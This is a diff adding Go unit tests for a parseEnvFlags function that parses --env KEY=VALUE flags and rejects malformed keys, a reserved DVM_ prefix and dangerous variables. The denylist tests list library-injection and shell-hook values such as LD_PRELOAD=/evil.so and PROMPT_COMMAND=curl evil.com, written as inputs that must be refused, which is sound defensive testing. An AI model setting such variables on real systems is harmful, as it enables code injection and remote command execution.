@@ -1149,6 +1149,228 @@ func TestCreateWorkspace_NoGitRepoWhenAppHasNone(t *testing.T) {
 		"Workspace should not have GitRepoID when App has none and --repo not provided")
 }
 
+// =============================================================================
+// TDD Phase 2 (RED): WI-4 — parseEnvFlags function for --env KEY=VALUE flag
+//
+// These tests call parseEnvFlags which does NOT exist yet. They are intended
+// to fail at compile-time (Phase 2 RED) until Phase 3 implementation.
+// =============================================================================
+
+// TestParseEnvFlags_ValidPairs verifies that valid KEY=VALUE pairs are parsed
+// correctly into a map[string]string.
+func TestParseEnvFlags_ValidPairs(t *testing.T) {
+	tests := []struct {
+		name      string
+		input     string
+		wantKey   string
+		wantValue string
+	}{
+		{
+			name:      "simple key-value",
+			input:     "MY_VAR=hello",
+			wantKey:   "MY_VAR",
+			wantValue: "hello",
+		},
+		{
+			name:      "db host",
+			input:     "DB_HOST=localhost",
+			wantKey:   "DB_HOST",
+			wantValue: "localhost",
+		},
+		{
+			name:      "URL with equals and special chars in value",
+			input:     "URL=https://example.com/path?q=1&b=2",
+			wantKey:   "URL",
+			wantValue: "https://example.com/path?q=1&b=2",
+		},
+		{
+			name:      "empty value",
+			input:     "KEY=",
+			wantKey:   "KEY",
+			wantValue: "",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result, err := parseEnvFlags([]string{tt.input})
+			if err != nil {
+				t.Errorf("parseEnvFlags(%q) returned unexpected error: %v", tt.input, err)
+				return
+			}
+			got, ok := result[tt.wantKey]
+			if !ok {
+				t.Errorf("parseEnvFlags(%q) result missing key %q; got map: %v", tt.input, tt.wantKey, result)
+				return
+			}
+			if got != tt.wantValue {
+				t.Errorf("parseEnvFlags(%q)[%q] = %q, want %q", tt.input, tt.wantKey, got, tt.wantValue)
+			}
+		})
+	}
+}
+
+// TestParseEnvFlags_InvalidPairs verifies that malformed KEY=VALUE strings
+// cause parseEnvFlags to return an error.
+func TestParseEnvFlags_InvalidPairs(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+	}{
+		{
+			name:  "no equals sign",
+			input: "JUSTKEY",
+		},
+		{
+			name:  "empty key",
+			input: "=value",
+		},
+		{
+			name:  "empty string",
+			input: "",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := parseEnvFlags([]string{tt.input})
+			if err == nil {
+				t.Errorf("parseEnvFlags(%q) = nil, want error for invalid input", tt.input)
+			}
+		})
+	}
+}
+
+// TestParseEnvFlags_DangerousVars verifies that env var keys on the security
+// denylist are rejected by parseEnvFlags.
+func TestParseEnvFlags_DangerousVars(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+	}{
+		{
+			name:  "LD_PRELOAD blocked",
+			input: "LD_PRELOAD=/evil.so",
+		},
+		{
+			name:  "DYLD_INSERT_LIBRARIES blocked",
+			input: "DYLD_INSERT_LIBRARIES=/evil.dylib",
+		},
+		{
+			name:  "BASH_ENV blocked",
+			input: "BASH_ENV=/evil.sh",
+		},
+		{
+			name:  "PROMPT_COMMAND blocked",
+			input: "PROMPT_COMMAND=curl evil.com",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := parseEnvFlags([]string{tt.input})
+			if err == nil {
+				t.Errorf("parseEnvFlags(%q) = nil, want error for dangerous env var", tt.input)
+			}
+		})
+	}
+}
+
+// TestParseEnvFlags_DVMPrefixBlocked verifies that keys beginning with DVM_
+// are rejected as reserved namespace.
+func TestParseEnvFlags_DVMPrefixBlocked(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+	}{
+		{
+			name:  "DVM_WORKSPACE blocked",
+			input: "DVM_WORKSPACE=fake",
+		},
+		{
+			name:  "DVM_CUSTOM blocked",
+			input: "DVM_CUSTOM=value",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := parseEnvFlags([]string{tt.input})
+			if err == nil {
+				t.Errorf("parseEnvFlags(%q) = nil, want error for reserved DVM_ prefix", tt.input)
+			}
+		})
+	}
+}
+
+// TestParseEnvFlags_InvalidKeyFormat verifies that keys not matching the strict
+// POSIX-uppercase pattern ([A-Z_][A-Z0-9_]*) are rejected.
+func TestParseEnvFlags_InvalidKeyFormat(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+	}{
+		{
+			name:  "lowercase key rejected",
+			input: "my_var=value",
+		},
+		{
+			name:  "starts with digit rejected",
+			input: "123VAR=value",
+		},
+		{
+			name:  "hyphen in key rejected",
+			input: "MY-VAR=value",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := parseEnvFlags([]string{tt.input})
+			if err == nil {
+				t.Errorf("parseEnvFlags(%q) = nil, want error for invalid key format", tt.input)
+			}
+		})
+	}
+}
+
+// TestParseEnvFlags_MultiplePairs verifies that multiple flags accumulate into
+// a single map, with last-one-wins semantics for duplicate keys.
+func TestParseEnvFlags_MultiplePairs(t *testing.T) {
+	t.Run("multiple distinct pairs accumulate", func(t *testing.T) {
+		result, err := parseEnvFlags([]string{"KEY1=val1", "KEY2=val2"})
+		if err != nil {
+			t.Fatalf("parseEnvFlags() unexpected error: %v", err)
+		}
+		if result["KEY1"] != "val1" {
+			t.Errorf("result[KEY1] = %q, want %q", result["KEY1"], "val1")
+		}
+		if result["KEY2"] != "val2" {
+			t.Errorf("result[KEY2] = %q, want %q", result["KEY2"], "val2")
+		}
+		if len(result) != 2 {
+			t.Errorf("len(result) = %d, want 2", len(result))
+		}
+	})
+
+	t.Run("duplicate key last-one-wins", func(t *testing.T) {
+		result, err := parseEnvFlags([]string{"KEY=old", "KEY=new"})
+		if err != nil {
+			t.Fatalf("parseEnvFlags() unexpected error: %v", err)
+		}
+		if result["KEY"] != "new" {
+			t.Errorf("result[KEY] = %q, want %q (last-one-wins)", result["KEY"], "new")
+		}
+		if len(result) != 1 {
+			t.Errorf("len(result) = %d, want 1", len(result))
+		}
+	})
+}
+
+// =============================================================================
+// End of WI-4 tests
+// =============================================================================
+
 // TestCreateWorkspace_InheritanceTableDriven is a comprehensive table-driven test
 // for GitRepo inheritance scenarios.
 // These tests EXPECT TO FAIL until the inheritance logic is implemented.
